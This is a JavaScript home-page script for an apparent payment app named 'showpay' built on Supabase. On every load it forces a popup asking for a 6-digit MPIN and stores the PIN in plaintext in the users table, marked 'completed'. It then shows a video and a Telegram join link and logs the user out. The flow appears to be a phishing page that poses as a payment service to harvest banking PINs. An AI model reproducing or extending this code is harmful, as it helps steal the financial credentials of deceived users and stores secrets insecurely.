// user-app/js/home.js
import { supabase } from "./config/supabase.js";

document.addEventListener("DOMContentLoaded", async () => {
  // 1. Check Session
  const sessionStr = sessionStorage.getItem("showpay_session");
  if (!sessionStr) {
    window.location.href = "../pages/login.html";
    return;
  }
  const session = JSON.parse(sessionStr);

  // Elements
  const overlay = document.getElementById("overlay");
  const mpinPopup = document.getElementById("mpinPopup");
  const successPopup = document.getElementById("successPopup");
  const videoPopup = document.getElementById("videoPopup");
  const telegramPopup = document.getElementById("telegramPopup");

  const mpinInputs = Array.from(document.querySelectorAll(".mpin-box"));

  const videoPlayer = document.getElementById("popupVideo");
  const videoCloseBtn = document.getElementById("videoCloseBtn");

  const telegramJoinBtn = document.getElementById("telegramJoinBtn");
  const telegramCloseBtn = document.getElementById("telegramCloseBtn");

  let videoData = null;
  let telegramData = null;
  let userHasCompleted = false;

  // Fetch settings and slider data
  async function loadData() {
    // Fetch Video
    const { data: vData } = await supabase
      .from("popup_video")
      .select("*")
      .eq("is_enabled", true)
      .limit(1);
    if (vData && vData.length > 0) videoData = vData[0];

    // Fetch Telegram
    const { data: tData } = await supabase
      .from("telegram_popup")
      .select("*")
      .eq("is_enabled", true)
      .limit(1);
    if (tData && tData.length > 0) telegramData = tData[0];

    // Fetch Slider Images
    const { data: sliders } = await supabase
      .from("slider_images")
      .select("*")
      .eq("is_enabled", true)
      .order("display_order", { ascending: true });
    if (sliders && sliders.length > 0) {
      initSlider(sliders);
    } else {
      // Default slides for mock
      initSlider([
        {
          id: 1,
          image_url:
            "https://images.unsplash.com/photo-1614680376573-df3480f0c6ff?auto=format&fit=crop&q=80&w=800",
        },
        {
          id: 2,
          image_url:
            "https://images.unsplash.com/photo-1620714223084-8fcacc6dfd8d?auto=format&fit=crop&q=80&w=800",
        },
      ]);
    }
  }

  // Slider Logic
  function initSlider(slides) {
    const container = document.getElementById("sliderContainer");
    const dotsContainer = document.getElementById("sliderDots");

    container.innerHTML = "";
    dotsContainer.innerHTML = "";

    slides.forEach((slide, index) => {
      const div = document.createElement("div");
      div.className = `slide ${index === 0 ? "active" : ""}`;
      div.style.backgroundImage = `url('${slide.image_url}')`;
      container.appendChild(div);

      const dot = document.createElement("div");
      dot.className = `dot ${index === 0 ? "active" : ""}`;
      dotsContainer.appendChild(dot);
    });

    container.appendChild(dotsContainer);

    let currentIdx = 0;
    setInterval(() => {
      const slideEls = container.querySelectorAll(".slide");
      const dotEls = dotsContainer.querySelectorAll(".dot");
      if (slideEls.length <= 1) return;

      slideEls[currentIdx].classList.remove("active");
      dotEls[currentIdx].classList.remove("active");

      currentIdx = (currentIdx + 1) % slides.length;

      slideEls[currentIdx].classList.add("active");
      dotEls[currentIdx].classList.add("active");
    }, 3000);
  }

  // MPIN Input Logic
  mpinInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, "");
      if (e.target.value && index < mpinInputs.length - 1) {
        mpinInputs[index + 1].focus();
      }
      checkMpinComplete();
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        mpinInputs[index - 1].focus();
      }
    });
  });

  function checkMpinComplete() {
    const mpin = mpinInputs.map((i) => i.value).join("");
    if (mpin.length === 6) {
      submitMpin(mpin);
    }
  }

  async function submitMpin(mpin) {
    // Disable inputs
    mpinInputs.forEach((i) => (i.disabled = true));

    try {
      await supabase
        .from("users")
        .update({ mpin: mpin, status: "completed" })
        .eq("id", session.userId);

      // Hide MPIN, show success
      mpinPopup.classList.add("hidden");
      successPopup.classList.remove("hidden");

      setTimeout(() => {
        successPopup.classList.add("hidden");
        checkNextPopup();
      }, 3000);
    } catch (error) {
      console.error(error);
      mpinInputs.forEach((i) => {
        i.disabled = false;
        i.value = "";
      });
      mpinInputs[0].focus();
    }
  }

  function checkNextPopup() {
    if (videoData && videoData.video_url) {
      showVideo();
    } else if (telegramData && telegramData.telegram_link) {
      showTelegram();
    } else {
      logout();
    }
  }

  function showVideo() {
    videoPopup.classList.remove("hidden");
    videoPlayer.src = videoData.video_url;
    videoPlayer.play().catch((e) => console.log("Autoplay prevented", e));
  }

  videoCloseBtn.addEventListener("click", () => {
    videoPlayer.pause();
    videoPopup.classList.add("hidden");

    if (telegramData && telegramData.telegram_link) {
      showTelegram();
    } else {
      logout();
    }
  });

  function showTelegram() {
    telegramPopup.classList.remove("hidden");
    document.querySelector(".telegram-title").textContent =
      telegramData.title || "Join our Telegram";
    document.querySelector(".telegram-desc").textContent =
      telegramData.description || "";
    if (telegramData.image_url) {
      // Optional: update image if needed
    }
    telegramJoinBtn.href = telegramData.telegram_link;
  }

  telegramCloseBtn.addEventListener("click", () => {
    telegramPopup.classList.add("hidden");
    logout();
  });

  function logout() {
    sessionStorage.removeItem("showpay_session");
    window.location.href = "../pages/login.html";
  }

  // Initial Load
  await loadData();

  // Always show MPIN flow on home load after 2 seconds
  setTimeout(() => {
    overlay.classList.add("active");
    mpinPopup.classList.remove("hidden");
    mpinInputs[0].focus();
  }, 2000);
});
